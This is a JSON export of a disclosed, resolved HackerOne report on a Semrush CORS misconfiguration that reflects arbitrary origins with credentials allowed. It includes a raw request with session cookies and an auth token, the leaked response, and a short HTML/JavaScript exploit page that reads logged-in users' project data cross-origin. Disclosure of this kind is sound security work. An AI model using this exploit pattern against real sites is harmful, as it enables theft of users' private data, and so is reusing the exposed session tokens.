{
  "id": 235200,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzUyMDA=",
  "url": "https://hackerone.com/reports/235200",
  "title": "Cross-origin resource sharing misconfig | steal user information ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-06-01T01:44:03.428Z",
  "submitted_at": "2017-06-01T01:44:03.428Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bughuntermate",
    "url": "/bughuntermate",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/078/089/cf2d9ccc8e17928108969cbc19cd4bd629821065_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15966,
    "url": "https://hackerone.com/semrush",
    "handle": "semrush",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ZVXRWMB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T191849Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDPJGfzMJPn%2FnHJrTg5TD8VJt7cc%2B7xt9arg9h87wjVTQIhAM%2B08WEUMC%2BUcx%2B2hdKE1ivgl69a2PFRDj0l1KQ35JOLKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igxc6REi1pVr2zXPDYAqjwWCRNoXIU3Z8A9klwjX%2B4PXU5JMH4n3c4Xxyac%2FzcM4qEjGokM%2BodDuiCfV810H3RPNumOTmghuwpUtOqPiGZA0R6o4FfqXdVBJePjhoWFMZ5oyYhx8QoKT8PuzXNSA%2BpYbeLaQsOUGTAm7J75i0xTnBaL0Et8rpP3G3oZYzAU9OWGzkWuWo678fx%2F5oDeet6aguCO8%2FjDWAWiMPlN6oxA0Y4i8bURv5uhAbItXZl%2F0yhE2exJIDYuhibnmpFXE4%2Bh4OMBilIIaDJsskKaEvoRiBsP8PY5r9dUOPsiC2t1PrepaAylZRfjhQbU57g7kP%2BXv2Azc%2BaOC75t5dhupRUh3IutnzlkORL%2F9flfqfUwX%2Fn59Do8kRUtwAkCh3yRX10QjKZJ2ne4Iur3gmDYd7730ppAiYM1bJzBy64ccOil8x%2Bvg5kbFGNGzp9YfSc5ghFx%2BbloLgola%2Fni8oWJUsddymBwlOH1Nc1b8NaCF8sS543cl06BvyxFgTXcV%2BT1nYqmbNng7EacdyxDRA59wMe5EnLiHC9jf%2Fyed12tpPd7TuQum%2BZd5NMJ9l81o7GuQiV3Iwf7RfCipikpLdbEPrJ5KBz7N7ollSoHwBUmWFblws1uxvZ5ABLQCuLJXsIqDmwNZ8YeMo1Zl9PnApt6IBcXabJBIFW4QXgunB7XW%2FF8GEeBgWNPfJtR3gqYmZ4zNpydWJwwCQaxcSHzmhhIOe6NvN7K2ZLMO0i6h3M969d2ihazkodAbxBC8Qqi%2FO56M8pBcQ7RKERw1uOQVuOsUo00sLCOm9GI2vjoArqPsi2uqO8TymUrFN39ZbthQYfkk2QX3l30Kdtn%2F7or8XF7u2KLGun8MrTx9qKmP5rLywvEAMKbWwMYGOrAB5%2FUWgKr5RM0ekkakDndGCJIxQ1WUbxY2OhlZhi04RNqJLNUFscc5LCSsEv3VcDs9juIIgGNGSuS3aBOH06ehWLv8fV8Dci%2B0LfF%2Blop%2BQYN5P5q53wN%2FrQR837AV2pfRO9dOJarpcAoes%2B7W3iJxwKZRVrBcxvyyMt89kGzZLpab25bXG8Pp4OEOA%2FJOj1iBHT%2FNZPGiAkEIqPPujxC7I78QwyK2z%2BpF8s4ZRzTnxLc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f78bc6dd3e7542ab5196834c751da9e0a53a407c40f075cf0452f4e682738659",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ZVXRWMB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T191849Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDPJGfzMJPn%2FnHJrTg5TD8VJt7cc%2B7xt9arg9h87wjVTQIhAM%2B08WEUMC%2BUcx%2B2hdKE1ivgl69a2PFRDj0l1KQ35JOLKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igxc6REi1pVr2zXPDYAqjwWCRNoXIU3Z8A9klwjX%2B4PXU5JMH4n3c4Xxyac%2FzcM4qEjGokM%2BodDuiCfV810H3RPNumOTmghuwpUtOqPiGZA0R6o4FfqXdVBJePjhoWFMZ5oyYhx8QoKT8PuzXNSA%2BpYbeLaQsOUGTAm7J75i0xTnBaL0Et8rpP3G3oZYzAU9OWGzkWuWo678fx%2F5oDeet6aguCO8%2FjDWAWiMPlN6oxA0Y4i8bURv5uhAbItXZl%2F0yhE2exJIDYuhibnmpFXE4%2Bh4OMBilIIaDJsskKaEvoRiBsP8PY5r9dUOPsiC2t1PrepaAylZRfjhQbU57g7kP%2BXv2Azc%2BaOC75t5dhupRUh3IutnzlkORL%2F9flfqfUwX%2Fn59Do8kRUtwAkCh3yRX10QjKZJ2ne4Iur3gmDYd7730ppAiYM1bJzBy64ccOil8x%2Bvg5kbFGNGzp9YfSc5ghFx%2BbloLgola%2Fni8oWJUsddymBwlOH1Nc1b8NaCF8sS543cl06BvyxFgTXcV%2BT1nYqmbNng7EacdyxDRA59wMe5EnLiHC9jf%2Fyed12tpPd7TuQum%2BZd5NMJ9l81o7GuQiV3Iwf7RfCipikpLdbEPrJ5KBz7N7ollSoHwBUmWFblws1uxvZ5ABLQCuLJXsIqDmwNZ8YeMo1Zl9PnApt6IBcXabJBIFW4QXgunB7XW%2FF8GEeBgWNPfJtR3gqYmZ4zNpydWJwwCQaxcSHzmhhIOe6NvN7K2ZLMO0i6h3M969d2ihazkodAbxBC8Qqi%2FO56M8pBcQ7RKERw1uOQVuOsUo00sLCOm9GI2vjoArqPsi2uqO8TymUrFN39ZbthQYfkk2QX3l30Kdtn%2F7or8XF7u2KLGun8MrTx9qKmP5rLywvEAMKbWwMYGOrAB5%2FUWgKr5RM0ekkakDndGCJIxQ1WUbxY2OhlZhi04RNqJLNUFscc5LCSsEv3VcDs9juIIgGNGSuS3aBOH06ehWLv8fV8Dci%2B0LfF%2Blop%2BQYN5P5q53wN%2FrQR837AV2pfRO9dOJarpcAoes%2B7W3iJxwKZRVrBcxvyyMt89kGzZLpab25bXG8Pp4OEOA%2FJOj1iBHT%2FNZPGiAkEIqPPujxC7I78QwyK2z%2BpF8s4ZRzTnxLc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d152d572908d681ae0245cdb9b5ae19cc722000e3cde7aeb67dd48af2469f8e1"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Semrush",
      "twitter_handle": "",
      "website": "https://www.semrush.com/",
      "about": "Online Visibility Management Platform."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-12-17T01:33:19.703Z",
  "bug_reporter_agreed_on_going_public_at": "2017-11-17T01:33:17.140Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Man, treat you another drink.\n\n\n## Description\n\nAn HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.\n\n##POC1\n**Request**\n```\nGET /organic-traffic-insights/api/rest/1.2/users/███/projects?_=1496248656402 HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nReferer: https://www.semrush.com/projects/\nX-Requested-With: XMLHttpRequest\nCookie: wp13557=\"UWYYADs-TTTW:WWLHWYDtlnDl-TJIH-UYUTDDDIALHUZDLZTAHTIV-CCAY-XMLT-IUUA-UYUBWXWZACCWDlLtkNlo_Jht\"; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%2C%22db%22%3A%22sg%22%7D; db_date=current; userdata=%7B%22tz%22%3A%22GMT+8%22%2C%22ol%22%3A%22en%22%7D; _ga=GA1.2.412244322.1496213122; _gid=GA1.2.1937633003.1496213122; visit_first=1496213122000; __uvt=; uvts=65OAcWY4QhJHESTs; referer_purchase=https%3A%2F%2Fes.semrush.com%2Fdashboard%2F; sct:feedback:show=false; __insp_uid=2126149429; temp_db_but=sg; db=us; exp_feature_popup_closed=yes; about_sessionid=gue5yj2t8bmucnlwuv1y1cxilq7a7q8g; about_csrf=i6C8isOR7WLuVa1348FSsPH6rXzVEQSr; n_userid=LuWhoFku7Ou4q2PeBHIUAg==; __zlcmid=gngUE7HFajaRsy; _bizo_bzid=ec0d2554-575b-420b-b404-51b70939ec49; _bizo_cksm=34222E182676EC07; _bizo_np_stats=155%3D338%2C; auth_token=CMFMT27JhWR9cnbkoV1dHvFaxc4tQ3f0B4IAw5BfTOjyeKeF9FKx8w2kpiLl; __insp_wid=1632961932; __insp_slim=1496248714271; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vcHJvamVjdHMvIzgwMDEyMi92aWV3Lw%3D%3D; __insp_targlpt=U0VNcnVzaA%3D%3D; __insp_norec_howoften=true; __insp_norec_sess=true; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en; connect.sid=s%253A4cV9yXJcfQFXmC65JJn3KSP6Wp184s10.vGOEA1%252BgVTXbwDY4YSOkOjjnteLNyifmcQdJh8XZckI; _gat=1; _uetsid=_uetd1ba382c; JSESSIONID=4423D9EF5D5BEE794094AC0713E9EE8E; _gat_UA-6197637-22=1\nConnection: close\nOrigin: https://itqayzlbkshw.com\n```\n\n**Response**\n```\nHTTP/1.1 200 \nServer: nginx\nDate: Thu, 01 Jun 2017 01:36:26 GMT\nContent-Type: application/json;charset=UTF-8\nContent-Length: 884\nConnection: close\nAccess-Control-Allow-Origin: https://itqayzlbkshw.com\nVary: Origin\nAccess-Control-Allow-Credentials: true\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nX-Frame-Options: SAMEORIGIN\n\n[{\"key\":\"███\",\"projectId\":\"800122\",\"projectName\":\"dfsfsda\",\"status\":\"NOT_AUTHORISED\",\"authoriseUrl\":\"https://accounts.google.com/o/oauth2/auth?access_type=offline&approval_prompt=force&client_id=1093302022032-p190dsgnrdoavgstsem5i2pom6t9il6r.apps.googleusercontent.com&redirect_uri=http://gat.semrush.com/api/rest/1.2/auth&response_type=code&scope=https://www.googleapis.com/auth/analytics.readonly%20https://www.googleapis.com/auth/webmasters.readonly&state=█████████_800122_%5B%22https://www.googleapis.com/auth/analytics.readonly%22,%22https://www.googleapis.com/auth/webmasters.readonly%22%5D\",\"email\":null,\"accounts\":null,\"account\":null,\"property\":null,\"view\":null,\"url\":null,\"siteUrls\":null,\"siteUrl\":null,\"database\":\"us\",\"device\":\"desktop\",\"totals\":null,\"created\":null,\"accountName\":null,\"propertyName\":null,\"viewName\":null}]\n```\n\nTake note from request I inject a header Origin: https://itqayzlbkshw.com then from response it returns Access-Control-Allow-Origin: https://itqayzlbkshw.com. Which mean there is CORS misconfig here.\n\n##POC 2\n1. open https://example.com in browser then inspect the page and go to console.\n2. run the following code in console and you would find it pops up user information\n```\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/████/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n```\n\n\n##Exploit\n```\n<html>\n<script>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/███/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n</script>\n</html>\n```\n\nOpen above code in any browser and you would find it pops up user information like the attachment.\n\n##Comment\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server\n\n## How to fix \nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\n\n\n\n ",
  "weakness": {
    "id": 145,
    "name": "Misconfiguration"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 190113,
      "file_name": "cors.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/190/113/745ef5ea261711f865a4b670e68637d17d509ff7/cors.PNG?response-content-disposition=attachment%3B%20filename%3D%22cors.PNG%22%3B%20filename%2A%3DUTF-8%27%27cors.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ZVXRWMB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T191849Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDPJGfzMJPn%2FnHJrTg5TD8VJt7cc%2B7xt9arg9h87wjVTQIhAM%2B08WEUMC%2BUcx%2B2hdKE1ivgl69a2PFRDj0l1KQ35JOLKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igxc6REi1pVr2zXPDYAqjwWCRNoXIU3Z8A9klwjX%2B4PXU5JMH4n3c4Xxyac%2FzcM4qEjGokM%2BodDuiCfV810H3RPNumOTmghuwpUtOqPiGZA0R6o4FfqXdVBJePjhoWFMZ5oyYhx8QoKT8PuzXNSA%2BpYbeLaQsOUGTAm7J75i0xTnBaL0Et8rpP3G3oZYzAU9OWGzkWuWo678fx%2F5oDeet6aguCO8%2FjDWAWiMPlN6oxA0Y4i8bURv5uhAbItXZl%2F0yhE2exJIDYuhibnmpFXE4%2Bh4OMBilIIaDJsskKaEvoRiBsP8PY5r9dUOPsiC2t1PrepaAylZRfjhQbU57g7kP%2BXv2Azc%2BaOC75t5dhupRUh3IutnzlkORL%2F9flfqfUwX%2Fn59Do8kRUtwAkCh3yRX10QjKZJ2ne4Iur3gmDYd7730ppAiYM1bJzBy64ccOil8x%2Bvg5kbFGNGzp9YfSc5ghFx%2BbloLgola%2Fni8oWJUsddymBwlOH1Nc1b8NaCF8sS543cl06BvyxFgTXcV%2BT1nYqmbNng7EacdyxDRA59wMe5EnLiHC9jf%2Fyed12tpPd7TuQum%2BZd5NMJ9l81o7GuQiV3Iwf7RfCipikpLdbEPrJ5KBz7N7ollSoHwBUmWFblws1uxvZ5ABLQCuLJXsIqDmwNZ8YeMo1Zl9PnApt6IBcXabJBIFW4QXgunB7XW%2FF8GEeBgWNPfJtR3gqYmZ4zNpydWJwwCQaxcSHzmhhIOe6NvN7K2ZLMO0i6h3M969d2ihazkodAbxBC8Qqi%2FO56M8pBcQ7RKERw1uOQVuOsUo00sLCOm9GI2vjoArqPsi2uqO8TymUrFN39ZbthQYfkk2QX3l30Kdtn%2F7or8XF7u2KLGun8MrTx9qKmP5rLywvEAMKbWwMYGOrAB5%2FUWgKr5RM0ekkakDndGCJIxQ1WUbxY2OhlZhi04RNqJLNUFscc5LCSsEv3VcDs9juIIgGNGSuS3aBOH06ehWLv8fV8Dci%2B0LfF%2Blop%2BQYN5P5q53wN%2FrQR837AV2pfRO9dOJarpcAoes%2B7W3iJxwKZRVrBcxvyyMt89kGzZLpab25bXG8Pp4OEOA%2FJOj1iBHT%2FNZPGiAkEIqPPujxC7I78QwyK2z%2BpF8s4ZRzTnxLc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=acebdd91bb60ce6d929f7f4181d64753634ddced1f31858faa842482878d3292",
      "file_size": 88896,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-12-17T01:33:17.253Z",
  "allow_singular_disclosure_after": -245007931.92980024,
  "singular_disclosure_allowed": true,
  "vote_count": 94,
  "voters": [
    "smither",
    "tinmo",
    "8910jq",
    "jokebookservice1",
    "defenderwww",
    "jensec",
    "sp1d3rs",
    "europa",
    "bogdantc",
    "kapytein",
    "and 84 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
